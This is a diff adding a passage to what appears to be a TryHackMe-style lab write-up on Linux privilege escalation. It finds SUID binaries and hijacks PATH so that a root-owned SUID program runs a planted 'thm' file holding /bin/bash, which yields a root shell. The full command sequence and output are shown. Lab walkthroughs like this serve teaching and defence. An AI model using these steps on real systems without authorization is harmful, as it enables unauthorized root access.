@@ -591,3 +591,57 @@ $ echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 ```
 
+Searching for files with SUID bit. 
+
+```
+$ find / -perm -u=s 2>/dev/null
+
+/snap/core20/1169/usr/bin/chfn
+/snap/core20/1169/usr/bin/chsh
+/usr/bin/mount
+/home/murdoch/test
+```
+
+`/home/murdoch/test` file is suspicious. Trying to execute `test` file
+
+```
+$ cd /home/murdoch/      
+$ ls
+test  thm.py
+$ ls -la
+total 32
+drwxrwxrwx 2 root root  4096 Oct 22  2021 .
+drwxr-xr-x 5 root root  4096 Jun 20  2021 ..
+-rwsr-xr-x 1 root root 16712 Jun 20  2021 test
+-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
+$ ./test
+sh: 1: thm: not found
+```
+
+`thm` file is not found. We can exploit `PATH` to add a file globally accessible from provided folder, in this case it will be `/tmp`
+
+```
+$ PATH=/tmp:$PATH
+$ echo $PATH
+/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+```
+
+Let's create `thm` file with our exploit. Test file was not able to find this file. But now as `/tmp` is in the the `PATH` variable it will search `thm` file in `/tmp` dir and execute as root (owner of `test` file is `root`)
+
+```
+$ cd /tmp
+$ echo /bin/bash > thm
+$ chmod +x thm
+```
+
+Executing test file. This will look for `thm` file in folders of `PATH` variable. After finding `thm` file in `/tmp` folder `test` file will execute (as developed by owner) the `thm` file and the exploit inside it.
+
+```
+$ cd -
+/home/murdoch
+$ ./test
+root@ip-10-10-77-51:/home/murdoch# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+```
+
+
